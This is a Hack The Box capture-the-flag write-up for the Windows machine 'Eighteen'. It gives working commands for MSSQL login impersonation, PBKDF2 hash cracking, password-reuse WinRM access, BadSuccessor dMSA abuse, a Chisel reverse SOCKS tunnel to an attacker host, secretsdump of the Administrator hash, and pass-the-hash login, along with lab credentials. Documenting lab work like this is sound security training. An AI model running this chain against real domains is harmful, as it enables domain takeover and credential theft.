---
title: HTB Eighteen
slug: eighteen
lang: en
platform: Hack The Box
category: Windows
headline: MSSQL impersonation, PBKDF2 cracking and Windows Server 2025 BadSuccessor abuse
difficulty: Hard
objective: Administrator
date: 2025-11-21
tags: [Windows, MSSQL, PBKDF2, WinRM, BadSuccessor, DCSync]
---

# HTB Eighteen

## Executive Summary

Eighteen exposes IIS, MSSQL and WinRM. Initial credentials for `kevin` allow MSSQL access, where Kevin can impersonate the `appdev` login. The `financial_planner` database contains an admin PBKDF2 hash that is converted to Hashcat format and cracked. Password reuse provides WinRM access as `adam.scott`. Privilege escalation abuses CVE-2025-53779, also known as BadSuccessor, on a Windows Server 2025 domain controller to create a delegated Managed Service Account and impersonate privileged identities.

## Initial Access to MSSQL

```text
account: kevin / iNa2we6haRj2gaw!
```

The host exposed only HTTP, MSSQL and WinRM.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.1.43 -oG allPorts
sudo nmap -p80,1433,5985 -sCV -oN Targeted 10.129.1.43
```

![[Pasted image 20251120162636.png|Web account creation]]
![[Pasted image 20251120163401.png|SQL Server confirmation]]

MSSQL login succeeded with the provided credentials.

```bash
mssqlclient.py kevin:'iNa2we6haRj2gaw!'@eighteen.htb
```

![[Pasted image 20251120164227.png|MSSQL login as kevin]]

## MSSQL Impersonation and Hash Recovery

Database enumeration revealed `financial_planner` and an `appdev` login. NetExec confirmed Kevin could impersonate `appdev`.

```bash
nxc mssql 10.129.1.43 -u kevin -p 'iNa2we6haRj2gaw!' -M mssql_priv --local-auth
```

```sql
EXECUTE AS LOGIN = 'appdev';
select name from sys.tables;
```

![[Pasted image 20251120164530.png|Database enumeration]]
![[Pasted image 20251120170109.png|appdev login discovered]]
![[Pasted image 20251120175503.png|MSSQL impersonation rights]]
![[Pasted image 20251120202356.png|EXECUTE AS appdev]]
![[Pasted image 20251120202746.png|Table enumeration]]

The `users` table contained an admin PBKDF2 hash.

```text
pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133
```

![[Pasted image 20251120202947.png|Admin PBKDF2 hash]]

The hash was converted to Hashcat mode 10900 and cracked.

```bash
python3 pbkdf2-to-hashcat.py 'pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133'
hashcat -m 10900 hash.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

```text
admin:iloveyou1
```

![[Pasted image 20251120205922.png|Hashcat format conversion]]
![[Pasted image 20251120210424.png|Hashcat cracking]]
![[Pasted image 20251120211556.png|Admin password recovered]]

## WinRM as adam.scott

RID brute force identified domain users, and password reuse worked for `adam.scott` over WinRM.

```bash
nxc mssql 10.129.1.82 -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute --local-auth
nxc winrm 10.129.1.82 -u users.txt -p 'iloveyou1' --continue-on-success
```

![[Pasted image 20251120211836.png|RID brute force users]]
![[Pasted image 20251120212219.png|adam.scott WinRM access]]
![[Pasted image 20251120212439.png|User flag]]

## BadSuccessor Privilege Escalation

CVE-2025-53779 affects Windows Server 2025 Domain Controllers and involves delegated Managed Service Accounts (dMSA), Kerberos delegation and LDAP property validation. The target was checked with BadSuccessor.

```powershell
Import-Module .\BadSuccessor.ps1
BadSuccessor -mode check -Domain eighteen.htb
```

![[Pasted image 20251120215523.png|BadSuccessor module download]]
![[Pasted image 20251120215656.png|BadSuccessor module import]]
![[Pasted image 20251120215859.png|BadSuccessor vulnerability check]]

A malicious dMSA was created to delegate access from `adam.scott` to an Administrator-equivalent path.

```powershell
BadSuccessor -mode exploit -Path "OU=Staff,DC=eighteen,DC=htb" -Name "nory_dmsa" -DelegatedAdmin "adam.scott" -DelegateTarget "Administrator" -domain "eighteen.htb"
```

![[Pasted image 20251120220159.png|BadSuccessor exploitation]]

## Kerberos and SecretsDump through SOCKS

Chisel was used to provide a SOCKS proxy back through the victim.

```bash
./chisel server --reverse -p 8080
.\chisel.exe client 10.10.16.22:8080 R:1080:socks
```

![[Pasted image 20251120220605.png|Chisel server]]
![[Pasted image 20251120222545.png|Chisel client]]
![[Pasted image 20251120221916.png|Proxychains configuration]]

The dMSA ticket was requested and exported.

```bash
proxychains /usr/bin/getST.py eighteen.htb/adam.scott:iloveyou1 -impersonate "nory_dmsa$" -dc-ip 10.129.1.82 -self -dmsa
export KRB5CCNAME='nory_dmsa$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache'
```

![[Pasted image 20251121054221.png|Time sync issue and retry]]
![[Pasted image 20251121062050.png|dMSA ticket obtained]]
![[Pasted image 20251121062150.png|KRB5CCNAME export]]

SecretsDump recovered the Administrator hash, which was used for WinRM.

```bash
proxychains -q /usr/bin/secretsdump.py -k -no-pass dc01.eighteen.htb -just-dc-user Administrator -dc-ip 10.129.210.173
evil-winrm -i 10.129.210.173 -u 'administrator' -H '0b133be956bfaddf9cea56701affddec'
```

![[Pasted image 20251121062533.png|Administrator hash via secretsdump]]
![[Pasted image 20251121062737.png|Administrator shell]]

## Key Takeaways

- MSSQL impersonation can expose application secrets and usable password material.
- PBKDF2 hashes must be converted correctly before Hashcat cracking.
- Windows Server 2025 AD-specific bugs require version-aware enumeration.
- BadSuccessor-style dMSA abuse can lead directly to DCSync-grade access.
